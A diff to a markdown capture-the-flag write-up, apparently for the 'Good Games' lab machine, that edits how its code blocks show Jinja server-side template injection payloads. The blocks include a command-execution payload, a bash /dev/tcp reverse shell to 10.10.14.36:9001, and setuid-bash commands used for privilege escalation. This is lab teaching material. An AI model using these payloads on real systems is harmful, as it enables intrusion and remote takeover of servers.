@@ -92,16 +92,15 @@ Yup I was logged in.  A great example of why you should not re-use passwords. I 
 As you can see after entering the payload 
 
 ```bash
-7*7
+\{\{7*7\}\}
 ```
-Inside double curly brackets \{\{ \}\}.  
 
 For the full name, upon saving this the templating engine has interpreted this as 49.  So we have a SSTI vulnerability we can exploit.  After heading over to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) which is a great resource.  Within the SSTI section I found some payloads which could potentially give us RCE or remote code execution. 
 
 I used the payload 
 
 ```bash
-self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()
+\{\{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()\}\}
 ``` 
 and entered a date of birth and phone number and hit save. 
 
@@ -113,7 +112,7 @@ As you can see from the username on the right of the page it is showing we have 
 So now it was time to leverage this code execution to get a reverse shell on the server.  With the payload 
 
 ```bash
-self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.36/9001 0>&1"').read()
+\{\{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.36/9001 0>&1"').read()\}\}
 ```
 
 [<img src="../images/good_games/rev_shell.png"
@@ -168,7 +167,7 @@ After a while I realised that as I was root on the docker container, if I could 
 
 So I thought the easiest way to do this would be to copy the legitimate `/bin/bash` file on the host machine to `/home/augustus` directory.  I then switched back to the root user within the docker container and set ownership of `bin/bash` as root. And made the file a setuid executable.
 
-`chown root:root bash`
+`chown root:root bash` \n
 `chmod +s bash`
 
 [<img src="../images/good_games/root_own_bash.png"
